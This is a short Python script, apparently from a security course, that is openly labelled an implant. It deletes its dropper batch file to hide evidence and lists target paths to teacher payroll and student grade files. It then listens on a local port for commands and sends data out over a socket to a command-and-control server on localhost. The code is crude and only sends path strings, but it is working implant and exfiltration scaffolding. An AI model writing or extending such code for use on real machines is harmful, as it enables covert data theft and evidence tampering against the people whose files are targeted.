import os
import requests
import socket
import sys

print("Implant Running")
#Remove evidence of script.bat from the start
try:
    os.remove("script.bat")
except:
    print("Batch file already gone")

#Add the paths to paths.txt
with open('Paths.txt', 'w') as f:
    f.write('C:\\Users\\CS590J\\Desktop\\Teacher Files\\Payroll.txt\n')
    f.write('C:\\Users\\CS590J\\Desktop\\Student Files\\Grades.txt\n')
    f.close()

def recieve_command():
    connection, client_address = implant_socket.accept()
    try:
        #Recieves and prints the data
        while True:
            data = connection.recv(100)
            if data:
                return(data)
            
    finally:
        # Clean up the connection
        connection.close()


def send_exfil(data):
    try:
        # Send data
        print('sending:', data)
        c2_socket.sendall(data)
    
    except:
        print("Error")

# Create a TCP/IP socket
c2_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Connect the socket to the port where the server is listening
c2_server_address = ('localhost', 9999)

# Create a TCP/IP socket
implant_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Bind the socket to the port
implant_server_address = ('localhost', 10000)
implant_socket.bind(implant_server_address)

implant_socket.listen(1)

while(True):
    comm = recieve_command()
    print(comm)

    if(True):
        file1 = open('Paths.txt', 'r')
        Lines = file1.readlines()

        
        print("Connecting to Socket")
        c2_socket.connect(c2_server_address)

        for line in Lines:
            send_exfil(str.encode(line))

        try:
            print("Closing Socket")
            c2_socket.close()
        except:
            print("error")


    
    